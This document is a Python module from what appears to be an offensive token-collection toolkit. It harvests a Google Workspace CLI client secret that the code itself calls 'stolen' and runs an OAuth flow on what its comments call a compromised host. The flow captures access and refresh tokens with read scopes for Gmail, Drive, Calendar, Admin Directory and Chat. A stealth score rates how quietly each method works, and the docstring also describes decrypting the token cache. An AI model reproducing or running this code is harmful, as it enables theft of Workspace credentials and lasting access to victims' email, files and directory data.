"""Google Workspace CLI (gws-cli) token collector.

Extracts GWS tokens using the gws-cli client_secret.json found at
~/.config/gws/client_secret.json.  This gives Workspace scopes
(Gmail, Drive, Calendar, Admin Directory) — unlike gcloud which
gives only GCP scopes.

Two extraction methods:
  1. Device code flow (all platforms, stealth 3):
     Reads client_secret.json silently, then runs an interactive
     OAuth device code flow. Operator approves via URL.
     No Keychain prompt. Requires google-auth-oauthlib OR urllib.
  2. Token cache decrypt (not recommended on macOS — Keychain prompt):
     Decrypts ~/.config/gws/token_cache.json using Keychain key.
     TRIGGERS VISIBLE PROMPT on macOS. Windows/Linux may be silent.
"""

from __future__ import annotations

import json
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import home_dir, get_platform

TOKEN_ENDPOINT = "https://oauth2.googleapis.com/token"
DEVICE_AUTH_ENDPOINT = "https://oauth2.googleapis.com/device/code"

# Workspace scopes that map to Ninken services
GWS_SCOPES = [
    "openid",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://www.googleapis.com/auth/drive.readonly",
    "https://www.googleapis.com/auth/calendar.readonly",
    "https://www.googleapis.com/auth/admin.directory.user.readonly",
    "https://www.googleapis.com/auth/admin.directory.group.readonly",
    "https://www.googleapis.com/auth/chat.messages.readonly",
    "https://www.googleapis.com/auth/chat.spaces.readonly",
    "https://www.googleapis.com/auth/cloud-platform",
]


def _gws_dir() -> Path:
    return home_dir() / ".config" / "gws"


@CollectorRegistry.register
class GwsCliCollector(BaseCollector):
    """Collect Google Workspace tokens via gws-cli's client_secret.json."""

    service = "google"
    source = "gws_cli"
    stealth_score = 3  # Interactive device code flow

    def _read_client_secret(self) -> Optional[dict]:
        path = _gws_dir() / "client_secret.json"
        if not path.exists():
            return None
        try:
            data = json.loads(path.read_text())
            installed = data.get("installed", {})
            if installed.get("client_id") and installed.get("client_secret"):
                return {
                    "client_id": installed["client_id"],
                    "client_secret": installed["client_secret"],
                }
        except (json.JSONDecodeError, KeyError):
            pass
        return None

    def discover(self) -> List[DiscoveredToken]:
        results = []
        path = _gws_dir() / "client_secret.json"
        client = self._read_client_secret()

        if client:
            token_cache = _gws_dir() / "token_cache.json"
            cache_info = ""
            if token_cache.exists():
                cache_info = f", token_cache.json present ({token_cache.stat().st_size}B, encrypted)"

            results.append(DiscoveredToken(
                service=self.service,
                source=self.source,
                path=str(path),
                account_hint=f"client_id={client['client_id'][:25]}...",
                stealth_score=self.stealth_score,
                details=(
                    f"GWS device code flow — Workspace scopes "
                    f"(Gmail/Drive/Calendar/Admin){cache_info}"
                ),
            ))
        return results

    def collect(self) -> List[CollectedToken]:
        results = []

        client = self._read_client_secret()
        if not client:
            self._warn("~/.config/gws/client_secret.json not found")
            return results

        import http.server
        import socket
        import subprocess
        import threading
        import webbrowser

        self._info("Starting OAuth flow with stolen gws-cli client_secret.json...")

        # 1. Find free port for capture server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]

        redirect_uri = f"http://localhost:{port}"
        auth_code = [None]

        # 2. Capture server
        class CaptureHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                params = urllib.parse.parse_qs(
                    urllib.parse.urlparse(self.path).query
                )
                if "code" in params:
                    auth_code[0] = params["code"][0]
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(
                        b"<h2>NinLoader: GWS token captured! Close this tab.</h2>"
                    )
                elif "error" in params:
                    auth_code[0] = "ERROR:" + params.get("error", ["?"])[0]
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"OAuth error")
                else:
                    self.send_response(200)
                    self.end_headers()

            def log_message(self, *a):
                pass

        server = http.server.HTTPServer(("127.0.0.1", port), CaptureHandler)

        def serve():
            while not auth_code[0]:
                server.handle_request()

        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()

        # 3. Build OAuth URL
        scope = " ".join(GWS_SCOPES)
        oauth_url = (
            "https://accounts.google.com/o/oauth2/auth?"
            + urllib.parse.urlencode(
                {
                    "client_id": client["client_id"],
                    "redirect_uri": redirect_uri,
                    "response_type": "code",
                    "scope": scope,
                    "access_type": "offline",
                    "prompt": "consent",
                },
                quote_via=urllib.parse.quote,
            )
        )

        # 4. Open browser (brief tab flash on compromised host)
        self._info("Opening browser for OAuth consent...")
        self._info("Select your Google account and click Continue → Allow")
        plat = get_platform()
        if plat == "macos":
            subprocess.Popen(
                ["open", "-a", "Google Chrome", oauth_url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        elif plat == "windows":
            subprocess.Popen(
                ["start", "", oauth_url],
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        else:
            webbrowser.open(oauth_url)

        # 5. Wait for redirect (max 3 minutes)
        self._info(f"Waiting for redirect on port {port}...")
        deadline = time.time() + 180
        while time.time() < deadline and not auth_code[0]:
            time.sleep(0.5)

        server.server_close()

        if not auth_code[0]:
            self._warn("Timeout — no OAuth redirect received (3 min)")
            return results

        if auth_code[0].startswith("ERROR:"):
            self._warn(f"OAuth error: {auth_code[0]}")
            return results

        # 6. Exchange auth code for tokens
        self._info("Auth code captured! Exchanging for tokens...")
        token_data = self._exchange_code(auth_code[0], client, redirect_uri)
        if not token_data:
            return results

        # 7. Extract email from ID token
        email = None
        id_token = token_data.get("id_token", "")
        if id_token:
            email = self._decode_email(id_token)

        results.append(CollectedToken(
            service=self.service,
            source=self.source,
            stealth_score=self.stealth_score,
            account_id=email,
            username=email,
            access_token=secure(token_data.get("access_token", "")),
            refresh_token=secure(token_data.get("refresh_token", "")),
            client_id=client["client_id"],
            client_secret=secure(client["client_secret"]),
            token_uri=TOKEN_ENDPOINT,
            scopes=token_data.get("scope", "").split(),
            expires_at=token_data.get("expires_in"),
            extra={"grant_type": "authorization_code", "gws_cli": True},
        ))

        self._info(f"SUCCESS — GWS token for {email or 'unknown'}")
        return results

    def _exchange_code(
        self, code: str, client: dict, redirect_uri: str
    ) -> Optional[dict]:
        data = urllib.parse.urlencode({
            "code": code,
            "client_id": client["client_id"],
            "client_secret": client["client_secret"],
            "redirect_uri": redirect_uri,
            "grant_type": "authorization_code",
        }).encode()
        req = urllib.request.Request(
            TOKEN_ENDPOINT, data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read())
        except urllib.error.URLError as e:
            self._warn(f"Token exchange failed: {e}")
            return None

    @staticmethod
    def _decode_email(id_token: str) -> Optional[str]:
        import base64
        parts = id_token.split(".")
        if len(parts) < 2:
            return None
        try:
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return payload.get("email")
        except Exception:
            return None
